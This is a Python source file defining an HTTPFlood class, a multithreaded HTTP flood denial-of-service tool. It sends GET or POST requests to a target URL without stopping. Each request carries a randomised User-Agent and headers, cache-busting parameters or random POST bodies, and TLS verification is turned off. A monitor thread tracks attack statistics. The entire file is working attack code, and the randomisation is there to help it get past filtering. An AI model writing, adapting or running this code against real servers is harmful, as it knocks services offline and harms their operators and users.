import requests
import threading
import random
import time
from fake_useragent import UserAgent
from utils.monitor import AttackMonitor

class HTTPFlood:
    def __init__(self, target_url, num_threads=4, attack_type="GET"):
        self.target_url = target_url
        self.num_threads = num_threads
        self.attack_type = attack_type.upper()  # GET or POST
        self.running = False
        self.monitor = AttackMonitor()
        self.ua = UserAgent()
        
    def generate_headers(self):
        """生成随机HTTP请求头"""
        return {
            'User-Agent': self.ua.random,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'X-Requested-With': 'XMLHttpRequest',
            'Pragma': 'no-cache',
            'Cache-Control': 'no-cache',
        }
    
    def generate_post_data(self):
        """生成随机POST数据"""
        data = {}
        for _ in range(random.randint(3, 10)):
            key = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=8))
            value = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=16))
            data[key] = value
        return data
    
    def http_flood(self):
        session = requests.Session()
        while self.running:
            try:
                headers = self.generate_headers()
                
                if self.attack_type == "GET":
                    # 添加随机查询参数
                    params = {
                        'nocache': random.random(),
                        't': int(time.time() * 1000)
                    }
                    response = session.get(
                        self.target_url,
                        params=params,
                        headers=headers,
                        timeout=1,
                        verify=False
                    )
                else:  # POST attack
                    data = self.generate_post_data()
                    response = session.post(
                        self.target_url,
                        data=data,
                        headers=headers,
                        timeout=1,
                        verify=False
                    )
                
                self.monitor.update_stats("http_flood", 1)
                time.sleep(random.uniform(0.1, 0.3))  # 随机延迟
                
            except Exception as e:
                print(f"请求失败: {e}")
    
    def start_attack(self):
        self.running = True
        threads = []
        
        for _ in range(self.num_threads):
            thread = threading.Thread(target=self.http_flood)
            thread.daemon = True
            threads.append(thread)
            thread.start()
        
        # 启动监控线程
        monitor_thread = threading.Thread(target=self.monitor.start_monitoring)
        monitor_thread.daemon = True
        monitor_thread.start()
        
        return threads
    
    def stop_attack(self):
        self.running = False
        return self.monitor.get_stats() 